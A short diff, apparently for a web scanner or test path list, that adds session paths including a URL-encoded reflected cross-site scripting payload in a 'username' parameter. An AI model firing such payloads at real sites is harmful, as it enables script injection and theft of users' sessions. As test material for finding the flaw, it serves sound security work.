@@ -1,0 +1,3 @@
+/setup
+/session/begin
+/session/begin?username=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
